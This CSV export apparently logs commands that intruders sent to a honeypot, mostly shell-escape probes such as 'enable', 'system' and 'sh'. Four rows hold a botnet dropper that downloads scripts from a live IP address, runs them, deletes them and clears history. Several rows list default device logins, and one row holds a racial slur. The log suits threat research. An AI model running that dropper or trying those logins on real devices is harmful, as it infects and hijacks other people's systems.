id,command,connections_id
12967,sh,121074
12968,enable,121100
12969,system,121100
12970,shell,121100
12971,sh,121100
12972,enable,121155
12973,system,121155
12974,shell,121155
12975,sh,121155
12976,enable,121203
12977,system,121203
12978,shell,121203
12979,sh,121203
12980,sh,121205
12981,shell,121205
12982,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",121205
12983,sh,121205
12984,enable,121268
12985,system,121268
12986,shell,121268
12987,sh,121268
12988,enable,121362
12989,system,121362
12990,shell,121362
12991,sh,121362
12992,enable,121363
12993,system,121363
12994,shell,121363
12995,sh,121363
12996,enable,121365
12997,system,121365
12998,shell,121365
12999,sh,121365
13000,enable,121512
13001,system,121512
13002,shell,121512
13003,sh,121512
13004,enable,121549
13005,system,121549
13006,shell,121549
13007,sh,121549
13008,enable,121636
13009,system,121636
13010,shell,121636
13011,sh,121636
13012,enable,121692
13013,system,121692
13014,shell,121692
13015,sh,121692
13016,enable,121791
13017,system,121791
13018,shell,121791
13019,sh,121791
13020,enable,121948
13021,system,121948
13022,shell,121948
13023,sh,121948
13024,enable,122058
13025,system,122058
13026,shell,122058
13027,sh,122058
13028,enable,122171
13029,system,122171
13030,shell,122171
13031,sh,122171
13032,enable,122188
13033,system,122188
13034,shell,122188
13035,sh,122188
13036,enable,122532
13037,system,122532
13038,shell,122532
13039,sh,122532
13040,enable,122546
13041,system,122546
13042,shell,122546
13043,sh,122546
13044,sh,122560
13045,shell,122560
13046,enable,122598
13047,system,122598
13048,shell,122598
13049,sh,122598
13050,enable,122601
13051,system,122601
13052,shell,122601
13053,sh,122601
13054,enable,122666
13055,system,122666
13056,shell,122666
13057,sh,122666
13058,enable,122675
13059,system,122675
13060,shell,122675
13061,sh,122675
13062,enable,122728
13063,system,122728
13064,shell,122728
13065,sh,122728
13066,enable,122920
13067,system,122920
13068,shell,122920
13069,sh,122920
13070,enable,122957
13071,system,122957
13072,shell,122957
13073,sh,122957
13074,enable,123054
13075,system,123054
13076,shell,123054
13077,sh,123054
13078,enable,123095
13079,system,123095
13080,shell,123095
13081,sh,123095
13082,enable,123101
13083,system,123101
13084,shell,123101
13085,sh,123101
13086,enable,123115
13087,system,123115
13088,shell,123115
13089,sh,123115
13090,enable,123360
13091,system,123360
13092,shell,123360
13093,sh,123360
13094,sh,123392
13095,shell,123392
13096,sh,123394
13097,shell,123394
13098,sh,123395
13099,sh,123396
13100,shell,123395
13101,sh,123398
13102,shell,123396
13103,sh,123399
13104,sh,123400
13105,shell,123398
13106,sh,123401
13107,shell,123399
13108,shell,123400
13109,shell,123401
13110,enable,123443
13111,system,123443
13112,shell,123443
13113,sh,123443
13114,enable,123451
13115,system,123451
13116,shell,123451
13117,sh,123451
13118,enable,123455
13119,system,123455
13120,shell,123455
13121,sh,123455
13122,enable,123456
13123,system,123456
13124,shell,123456
13125,sh,123456
13126,enable,123468
13127,system,123468
13128,shell,123468
13129,sh,123468
13130,enable,123512
13131,system,123512
13132,shell,123512
13133,sh,123512
13134,enable,123627
13135,system,123627
13136,shell,123627
13137,sh,123627
13138,enable,123644
13139,system,123644
13140,shell,123644
13141,sh,123644
13142,enable,123652
13143,system,123652
13144,shell,123652
13145,sh,123652
13146,enable,123657
13147,system,123657
13148,shell,123657
13149,sh,123657
13150,enable,123734
13151,system,123734
13152,shell,123734
13153,sh,123734
13154,enable,123800
13155,system,123800
13156,shell,123800
13157,sh,123800
13158,enable,123805
13159,system,123805
13160,shell,123805
13161,sh,123805
13162,enable,123807
13163,system,123807
13164,shell,123807
13165,sh,123807
13166,enable,123854
13167,system,123854
13168,shell,123854
13169,sh,123854
13170,enable,123900
13171,system,123900
13172,shell,123900
13173,sh,123900
13174,enable,123913
13175,system,123913
13176,shell,123913
13177,sh,123913
13178,enable,123975
13179,system,123975
13180,shell,123975
13181,sh,123975
13182,sh,123978
13183,shell,123978
13184,Niggersh,123978
13185,shell,123978
13186,enable,123979
13187,system,123979
13188,shell,123979
13189,sh,123979
13190,enable,123983
13191,system,123983
13192,shell,123983
13193,sh,123983
13194,enable,123985
13195,system,123985
13196,shell,123985
13197,sh,123985
13198,enable,124008
13199,system,124008
13200,shell,124008
13201,sh,124008
13202,enable,124021
13203,system,124021
13204,shell,124021
13205,sh,124021
13206,enable,124022
13207,system,124022
13208,shell,124022
13209,sh,124022
13210,enable,124026
13211,system,124026
13212,shell,124026
13213,sh,124026
13214,enable,124060
13215,system,124060
13216,shell,124060
13217,sh,124060
13218,"echo $SHELL",124062
13219,"echo $SHELL",124063
13220,"echo $SHELL",124064
13221,"echo $SHELL",124065
13222,"echo $SHELL",124066
13223,"echo $SHELL",124067
13224,"echo $SHELL",124068
13225,"echo $SHELL",124069
13226,"echo $SHELL",124070
13227,"echo $SHELL",124071
13228,"echo $SHELL",124072
13229,"echo $SHELL",124073
13230,"echo $SHELL",124074
13231,"echo $SHELL",124075
13232,"echo $SHELL",124076
13233,"echo $SHELL",124077
13234,"echo $SHELL",124078
13235,"echo $SHELL",124079
13236,"echo $SHELL",124080
13237,"echo $SHELL",124081
13238,"echo $SHELL",124082
13239,"echo $SHELL",124083
13240,"echo $SHELL",124084
13241,"echo $SHELL",124085
13242,"echo $SHELL",124086
13243,"echo $SHELL",124087
13244,"echo $SHELL",124088
13245,"echo $SHELL",124089
13246,"echo $SHELL",124090
13247,"echo $SHELL",124091
13248,"echo $SHELL",124092
13249,"echo $SHELL",124093
13250,"echo $SHELL",124094
13251,"echo $SHELL",124095
13252,"echo $SHELL",124096
13253,"echo $SHELL",124097
13254,"echo $SHELL",124098
13255,"echo $SHELL",124099
13256,"echo $SHELL",124100
13257,"echo $SHELL",124101
13258,"echo $SHELL",124102
13259,enable,124116
13260,system,124116
13261,shell,124116
13262,sh,124116
13263,enable,124148
13264,system,124148
13265,shell,124148
13266,sh,124148
13267,enable,124189
13268,system,124189
13269,shell,124189
13270,sh,124189
13271,enable,124264
13272,system,124264
13273,shell,124264
13274,sh,124264
13275,enable,124295
13276,system,124295
13277,shell,124295
13278,sh,124295
13279,enable,124388
13280,system,124388
13281,shell,124388
13282,sh,124388
13283,enable,124389
13284,system,124389
13285,shell,124389
13286,sh,124389
13287,enable,124390
13288,system,124390
13289,shell,124390
13290,sh,124390
13291,sh,124421
13292,shell,124421
13293,enable,124421
13294,enable,124432
13295,system,124432
13296,shell,124432
13297,sh,124432
13298,enable,124445
13299,enable,124446
13300,system,124445
13301,system,124446
13302,shell,124445
13303,shell,124446
13304,sh,124445
13305,sh,124446
13306,enable,124465
13307,system,124465
13308,shell,124465
13309,sh,124465
13310,enable,124466
13311,system,124466
13312,shell,124466
13313,sh,124466
13314,enable,124538
13315,system,124538
13316,shell,124538
13317,sh,124538
13318,enable,124544
13319,system,124544
13320,shell,124544
13321,sh,124544
13322,enable,124627
13323,system,124627
13324,shell,124627
13325,sh,124627
13326,enable,124629
13327,enable,124630
13328,system,124629
13329,system,124630
13330,shell,124629
13331,shell,124630
13332,sh,124629
13333,sh,124630
13334,enable,124631
13335,system,124631
13336,shell,124631
13337,sh,124631
13338,sh,124632
13339,shell,124632
13340,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",124632
13341,sh,124632
13342,enable,124633
13343,system,124633
13344,shell,124633
13345,sh,124633
13346,enable,124635
13347,system,124635
13348,shell,124635
13349,sh,124635
13350,enable,124649
13351,system,124649
13352,shell,124649
13353,sh,124649
13354,enable,124658
13355,system,124658
13356,shell,124658
13357,sh,124658
13358,enable,124667
13359,system,124667
13360,shell,124667
13361,sh,124667
13362,enable,124721
13363,system,124721
13364,shell,124721
13365,sh,124721
13366,enable,124725
13367,system,124725
13368,shell,124725
13369,sh,124725
13370,enable,124727
13371,system,124727
13372,shell,124727
13373,sh,124727
13374,enable,124735
13375,system,124735
13376,shell,124735
13377,sh,124735
13378,enable,124773
13379,system,124773
13380,shell,124773
13381,sh,124773
13382,enable,124775
13383,system,124775
13384,shell,124775
13385,sh,124775
13386,enable,124782
13387,system,124782
13388,shell,124782
13389,sh,124782
13390,enable,124873
13391,system,124873
13392,shell,124873
13393,sh,124873
13394,enable,124877
13395,system,124877
13396,shell,124877
13397,sh,124877
13398,sh,124878
13399,shell,124878
13400,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",124878
13401,sh,124878
13402,enable,124889
13403,system,124889
13404,shell,124889
13405,sh,124889
13406,enable,124919
13407,system,124919
13408,shell,124919
13409,sh,124919
13410,enable,124922
13411,system,124922
13412,shell,124922
13413,sh,124922
13414,sh,124929
13415,shell,124929
13416,"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://102.165.48.81/njs.sh; chmod +x njs.sh; sh njs.sh; tftp 102.165.48.81 -c get tftp1.sh; chmod +x tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 102.165.48.81; chmod +x tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 102.165.48.81 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh;history -c",124929
13417,sh,124929
13418,enable,124930
13419,system,124930
13420,shell,124930
13421,sh,124930
13422,enable,124935
13423,system,124935
13424,shell,124935
13425,sh,124935
13426,enable,124937
13427,system,124937
13428,shell,124937
13429,sh,124937
13430,guest,124938
13431,12345,124938
13432,ubnt,124938
13433,admin,124939
13434,123456,124939
13435,admin,124939
13436,zhongxing,124939
13437,root,124940
13438,dreambox,124940
13439,root,124940
13440,root,124941
13441,54321,124941
13442,root,124941
13443,founder88,124941
13444,enable,124942
13445,system,124942
13446,shell,124942
13447,sh,124942
13448,enable,125072
13449,system,125072
13450,shell,125072
13451,sh,125072
13452,enable,125100
13453,system,125100
13454,shell,125100
13455,sh,125100
13456,enable,125101
13457,system,125101
13458,shell,125101
13459,sh,125101
13460,enable,125103
13461,system,125103
13462,shell,125103
13463,sh,125103
13464,enable,125251
13465,system,125251
13466,shell,125251
13467,sh,125251
13468,enable,125287
13469,system,125287
13470,shell,125287
13471,sh,125287
13472,enable,125343
13473,system,125343
13474,shell,125343
13475,sh,125343
13476,enable,125357
13477,system,125357
13478,shell,125357
13479,sh,125357
13480,enable,125360
13481,system,125360
13482,shell,125360
13483,sh,125360
13484,enable,125413
13485,system,125413
13486,shell,125413
13487,sh,125413
13488,enable,125578
13489,system,125578
13490,shell,125578
13491,sh,125578
13492,enable,125598
13493,system,125598
13494,shell,125598
13495,sh,125598
13496,enable,125667
13497,system,125667
13498,shell,125667
13499,sh,125667
13500,enable,125789
13501,system,125789
13502,shell,125789
13503,sh,125789
13504,enable,125790
13505,system,125790
13506,shell,125790
13507,sh,125790
13508,enable,125828
13509,system,125828
13510,shell,125828
13511,sh,125828
13512,enable,125889
13513,system,125889
13514,shell,125889
13515,sh,125889
13516,enable,125892
13517,system,125892
13518,shell,125892
13519,sh,125892
13520,enable,125928
13521,system,125928
13522,shell,125928
13523,sh,125928
13524,enable,125929
13525,system,125929
13526,shell,125929
13527,sh,125929
13528,enable,125930
13529,system,125930
13530,shell,125930
13531,sh,125930
13532,enable,125932
13533,system,125932
13534,shell,125932
13535,sh,125932
13536,enable,125933
13537,system,125933
13538,shell,125933
13539,sh,125933
13540,enable,126018
13541,system,126018
13542,shell,126018
13543,sh,126018
13544,enable,126026
13545,system,126026
13546,shell,126026
13547,sh,126026
13548,enable,126051
13549,system,126051
13550,shell,126051
13551,sh,126051
13552,enable,126144
13553,system,126144
13554,shell,126144
13555,sh,126144
13556,enable,126154
13557,system,126154
13558,shell,126154
13559,sh,126154
13560,enable,126155
13561,system,126155
13562,shell,126155
13563,sh,126155
13564,enable,126277
13565,system,126277
13566,shell,126277
13567,sh,126277
13568,enable,126278
13569,system,126278
13570,shell,126278
13571,sh,126278
13572,enable,126400
13573,system,126400
13574,shell,126400
13575,sh,126400
13576,enable,126479
13577,system,126479
13578,shell,126479
13579,sh,126479
13580,enable,126510
13581,system,126510
13582,shell,126510
13583,sh,126510
13584,enable,126578
13585,system,126578
13586,shell,126578
13587,sh,126578
13588,enable,126604
13589,system,126604
13590,shell,126604
13591,sh,126604
13592,enable,126605
13593,system,126605
13594,shell,126605
13595,sh,126605
13596,enable,126607
13597,system,126607
13598,shell,126607
13599,sh,126607
13600,enable,126741
13601,system,126741
13602,shell,126741
13603,sh,126741
13604,enable,126798
13605,system,126798
13606,shell,126798
13607,sh,126798
13608,enable,126799
13609,system,126799
13610,shell,126799
13611,sh,126799
13612,enable,126802
13613,system,126802
13614,shell,126802
13615,sh,126802
13616,enable,126814
13617,system,126814
13618,shell,126814
13619,sh,126814
13620,enable,126824
13621,system,126824
13622,shell,126824
13623,sh,126824
13624,enable,126832
13625,system,126832
13626,shell,126832
